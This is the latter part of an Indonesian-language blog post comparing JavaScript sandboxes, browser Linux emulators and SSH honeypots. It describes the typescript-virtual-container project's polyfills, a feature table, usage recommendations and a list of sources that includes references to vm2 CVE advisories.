Alih-alih mengimpor pustaka crypto Wasm, polyfill crypto mengimplementasikan SHA-256 dari nol memakai konstanta ronde FIPS 180-4. 166 baris JS murni dengan dukungan penuh keluaran hex/base64/Uint8Array. Semua hashing dalam pustaka lewat sana -- sidik jari kunci host SSH, checksum internal, semuanya. Ringkas, nol dependensi, berhasil.

**`node:os` -- membaca perangkat keras nyata peramban**

Yang ini perhatian yang bagus. Alih-alih mengembalikan nilai fiktif yang di hardcode, `node:os` membaca `navigator.deviceMemory` untuk RAM total dan `navigator.hardwareConcurrency` untuk jumlah CPU. Jadi `neofetch` dalam build peramban melaporkan sesuatu yang cocok dengan mesin aslimu -- bukan stub tiruan `2 core, 2 GB RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB secara bawaan
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // juga menganalisis navigator.userAgent untuk menebak string model CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stub jujur**

Peramban tidak bisa membuka socket TCP atau menjalankan SSH sungguhan, jadi ini stub yang melempar error `NotImplemented` dengan pesan jelas kalau sesuatu mencoba memakainya. Kegagalan tetap eksplisit, tanpa `undefined` yang dikembalikan di mana objek diharapkan. Hanya pesan kuat dan jelas "ini tidak jalan di peramban" -- yang tepat kamu inginkan.

**`process.js` dan `buffer.js` -- global yang disuntikkan**

Keduanya disuntikkan di atas setiap berkas bundle lewat opsi `inject` esbuild, jadi `process` dan `Buffer` tersedia global tanpa import eksplisit apa pun. `process.js` mungil : `env`, `version`, `platform: 'browser'`, `nextTick` lewat `queueMicrotask`, `uptime` lewat `performance.now()`. `buffer.js` adalah reimplementasi lengkap `Buffer` di atas `Uint8Array` -- semua metode `readUInt32BE`, `writeInt16LE`, enkode hex/base64 yang dibutuhkan implementasi SSH dan VFS.

---

Seluruh polyfill sekitar 640 baris JS yang ditulis tangan total. Tanpa paket npm, tanpa Wasm. Dan hasilnya adalah bundle peramban yang hanyalah pustakanya, berjalan native, tanpa kecemasan biasa "tapi apakah ini benar-benar jalan di peramban?" yang kamu miliki dengan pustaka yang didesain Node duluan. Layak melihat folder `polyfills/` di repo kalau kamu penasaran -- setiap berkas terkungkung baik dan bisa dibaca sendiri, yang merupakan pilihan gaya yang sangat saya hargai.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategori** | Sandbox JS | Sandbox JS | Sandbox JS | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **Mengisolasi JS** | ⚠️ cakupan | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | sebagian | n/a | ✅ Worker |
| **Kernel Linux sungguhan** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Interpreter shell** | ❌ | ❌ | ❌ | ✅ (nyata) | ✅ (nyata) | ✅ (nyata) | sebagian | ✅ (kustom) |
| **~170 perintah Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | sebagian | ~20 | ✅ |
| **Izin POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | sebagian | ✅ diterapkan |
| **Manajemen pengguna** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minim | ✅ lengkap |
| **Server SSH sungguhan** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/snapshot VFS** | ❌ | ❌ | ❌ | terbatas | ❌ | ❌ | ❌ | ✅ |
| **Jaringan virtual L2/L3** | ❌ | ❌ | ❌ | dasar | ❌ | ❌ | ❌ | ✅ lengkap |
| **VPN virtual** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Dukungan peramban** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js native** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API bertipe** | dasar | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ lengkap |
| **Kompatibilitas biner** | n/a | n/a | n/a | ✅ | ✅ | sebagian | n/a | ❌ |
| **Waktu boot** | seketika | seketika | seketika | 15-40 dtk | 15-40 dtk | 2-5 dtk | seketika | <1 dtk |
| **RAM/instans** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Dependensi runtime** | 0 | 1 (native) | 1 (Wasm) | 0 | proprietari | 1 | dependensi Python | 3 (ssh2, ws, fflate) |
| **Status** | stabil | ✅ aktif | ✅ aktif | ✅ sangat aktif | komersial | ✅ aktif | ✅ aktif | ✅ aktif |

---

## Kapan memakai apa

**Kamu harus mengeksekusi JavaScript tak tepercaya -- formula yang disubmit pengguna, plugin, hook skrip.**
→ `isolated-vm`. V8 Isolate sungguhan, batas memori ketat, jembatan komunikasi eksplisit. Hindari `vm2` -- daftar CVE terus bertambah, serius seperti ada yang baru setiap beberapa bulan. Hindari `vm` -- ini sama sekali bukan sandbox, tolong.

**Kamu harus mengisolasi JS dan tidak ingin ekstensi native, atau butuh kompatibilitas peramban.**
→ `quickjs-emscripten`. Perbatasan Wasm, modul sekitar 500 KB, berfungsi di peramban dan Node. Lebih lambat dari V8 tapi benar-benar terisolasi.

**Kamu harus memboot OS Linux sungguhan yang tidak dimodifikasi dengan kompatibilitas biner.**
→ `v86` untuk Linux 32-bit, atau `container2wasm` kalau kamu punya image Docker yang sudah ada. Terima 150 MB+ RAM dan 30 detik boot, itulah dealnya. Kalau butuh 64-bit, lihat CheerpX atau pakai runtime kontainer sungguhan.

**Kamu harus mengintegrasikan terminal ala Linux ke aplikasi web tanpa backend.**
→ `v86` (OS lengkap, berat, lambat boot) atau bundle peramban `typescript-virtual-container` (simulator, lebih ringan, boot seketika, termasuk `startxfce4` untuk desktop lengkap yang cukup keren).

**Kamu butuh tutorial coding interaktif online atau IDE peramban.**
→ WebContainers kalau kamu fokus pada ekosistem Node.js. CheerpX kalau butuh userspace Linux sungguhan. Bundle peramban `typescript-virtual-container` kalau ingin opsi lebih ringan dengan API bertipe.

**Kamu ingin mengumpulkan TTP penyerang SSH dalam skala besar.**
→ Cowrie adalah standar produksi, titik. Berjalan di server Linux mana pun, terintegrasi dengan semua SIEM, kini punya mode LLM. Pakai saja Cowrie.

**Kamu ingin data honeypot SSH dalam aplikasi Node.js dengan API yang bisa diprogram.**
→ `typescript-virtual-container`. Perintah benar-benar dieksekusi. VFS adalah struktur data sungguhan yang bisa kamu snapshot dan bedakan seketika. Penyerang mendapatkan lingkungan interaktif yang meyakinkan, dan kamu mendapatkan data audit terstruktur tanpa meninggalkan Node.

**Kamu butuh otomatisasi shell / pengujian di CI tanpa Docker.**
→ `typescript-virtual-container`. Boot dalam kurang dari sedetik, snapshot sebelum tes, pulihkan setelahnya. Eksekusi perintah shell dengan API bertipe. Tanpa daemon Docker, tanpa kernel, tanpa VM, tanpa menunggu.

**Kamu butuh lingkungan shell multi-tenant (SaaS, edukasi, pelatihan).**
→ `typescript-virtual-container`. 5-20 MB per instans vs. 150-256 MB untuk emulator. 100 pengguna bersamaan : ~2 GB vs. ~25 GB. Itu perbedaan besar dalam biaya hosting!

**Kamu butuh honeypot realistis yang juga memungkinkanmu membangun lab jaringan multi-VM.**
→ `typescript-virtual-container` satu-satunya di ruang ini yang melakukan keduanya.

---

## Apa yang tidak bisa dilakukannya (dan saya ingin jujur soal itu)

Ia tidak bisa mengeksekusi biner x86 native. Kalau kamu butuh mengompilasi kode C, menjalankan interpreter Python sungguhan, atau memakai perangkat lunak yang dikompilasi untuk Linux, tidak ada ABI kernel untuk menopang panggilan sistem itu. Perintah seperti `gcc`, `python3`, dan `node` adalah stub -- mereka menjawab `--version` dan invokasi umum, tapi tidak mengeksekusi sesuatu yang nyata.

Ini kompromi fundamental : kamu mendapatkan 10 hingga 50 kali lebih sedikit memori, boot seketika, kompatibilitas peramban, API bertipe, SSH sungguhan, dan jaringan virtual -- dan kamu meninggalkan kompatibilitas biner dengan userspace Linux.

Fortune banyak memikirkan ini saat merancang proyek. Untuk kasus pemakaian yang ditargetkannya -- honeypot, pengujian, terminal tertanam, lingkungan CI -- mengeksekusi biner terkompilasi sebenarnya tidak pernah diperlukan. Pipeline shell, manipulasi berkas, routing jaringan dan SSH mencakup semuanya. Tapi kalau kasus pemakaianmu membutuhkan perangkat lunak terkompilasi sungguhan, `v86` atau Docker adalah jawaban yang benar, bukan ini.

---

## Untuk menyimpulkan

Jadi begitulah. Ekosistem ini lebih luas dan lebih terfragmentasi daripada tampaknya dari luar. `vm` adalah pemisah cakupan, bukan sandbox. `vm2` terus menumpuk CVE (sungguh, lihat advis bulan ini). `isolated-vm` jawaban yang benar untuk isolasi JS tapi hanya JS. `quickjs-emscripten` pilihan yang benar ketika kamu butuh kompatibilitas peramban atau ingin menghindari ekstensi native. `v86` dan CheerpX adalah emulator sungguhan ketika kamu butuh kompatibilitas biner sungguhan. WebContainers adalah Node.js dalam Wasm, bukan lingkungan Linux generalis. Cowrie adalah standar emas honeypot SSH, tapi itu Python dan tidak native Node.

Lalu ada `typescript-virtual-container` -- proyek Fortune -- yang hidup agak di kategorinya sendiri. Bukan emulator, bukan sandbox JS, bukan honeypot pasif. Sesuatu di antara semuanya yang terbukti mengejutkan berguna untuk banyak hal yang tidak bisa dilakukan yang lainnya.

`typescript-virtual-container` menjembatani kesenjangan yang tidak disentuh yang lainnya : lingkungan shell Linux lengkap dan bisa diprogram dengan SSH sungguhan, SFTP, izin POSIX, manajemen pengguna, jaringan virtual, dan API TypeScript bertipe -- berjalan dalam sekitar 10 MB, memboot dalam kurang dari sedetik, berfungsi baik di Node.js maupun peramban.

Kalau kamu ingin mencobanya : kode sumber ada di [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) dan ada demo online (termasuk `startxfce4` untuk desktop lengkap, yang sungguh sakit) di [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Lihat dan tinggalkan beberapa bintang untuk Fortune di GitHub, ia pantas mendapatkannya!

Terima kasih sudah membaca -- yang ini panjang bahkan untuk standar saya :) semoga berguna buatmu!

---

## Sumber

Saya mencoba menautkan setiap klaim ke sumber primer -- advis CVE, dok resmi, repo GitHub, artikel blog maintainer. Beberapa catatan : daftar CVE vm2 terus bertambah jadi tautan FortiGuard mungkin kedaluwarsa saat kamu membacanya (lihat halaman advis GitHub untuk yang terbaru). Tautan Bellard semuanya stabil -- situs pribadinya ada sejak dulu dan isinya tidak berubah. Dan kalau kamu ingin mendalami salah satu polyfill, cukup telusuri folder `polyfills/` di repo `typescript-virtual-container` langsung -- itu lebih mudah dibaca daripada deskripsi apa pun yang bisa saya tulis di sini.

### Sandbox JavaScript

- **Modul `vm` Node.js** -- dokumentasi resmi : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Peringatan keamanan `vm` Node.js** -- "Modul vm bukan mekanisme keamanan. Jangan pakai untuk mengeksekusi kode tak tepercaya" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Kronologi CVE vm2** -- Peringatan FortiGuard dengan daftar lengkap CVE dan tanggal : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Escape lewat error async, GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Entri Exploit DB dengan PoC lengkap : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 escape baru, analisis : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Post-mortem oxeye.io soal CVE-2022-36067 : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internal V8 Isolate** -- Panduan integrasi : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Mesin QuickJS** -- oleh Fabrice Bellard : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Model izin Deno** -- dok : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Keluarnya Deno 2** -- Oktober 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposal TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposal TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Artikel praktis Andrew Healey soal pendekatan sandbox Deno : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emulator Linux

- **`v86`** -- npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · Demo : [copy.sh/v86](https://copy.sh/v86)
- **Matriks dukungan OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS yang dipakai v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Ekstensi Bochs VBE** (referensi VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Emulator Bellard : [bellard.org/jslinux](https://bellard.org/jslinux/) · Catatan teknis (TinyEMU, riwayat, asm.js→Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Sumber C : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Mirror GitHub tak resmi : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Emulator JS OpenRISC : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- dok : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Panduan pthreads : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Dok API : [webcontainers.io](https://webcontainers.io) · Pengumuman : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Tinjauan InfoQ : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Artikel blog NTT : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Artikel Simon Willison : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** -- npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · situs : [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie** -- GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Dok : [docs.cowrie.org](https://docs.cowrie.org) · Situs : [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (diarsipkan) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js minimal : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Daftar terorganisasi : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Penemuan informasi sistem (cara penyerang mengidentifikasi honeypot) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo online** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Panduan arsitektur** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementasi protokol SSH) -- npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (kompresi snapshot VFS) -- npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transport shell WebSocket) -- npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Bacaan lanjutan

- **Model izin POSIX** -- Spesifikasi Open Group : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (pola yang dipakai dalam persistensi VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Model V8 Isolate** -- "Embedder's Guide" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Spesifikasi ISA RISC-V** (untuk konteks TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Arsitektur OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, kontras berguna dengan pendekatan Wasm : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL soal ukuran bundle quickjs-emscripten : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
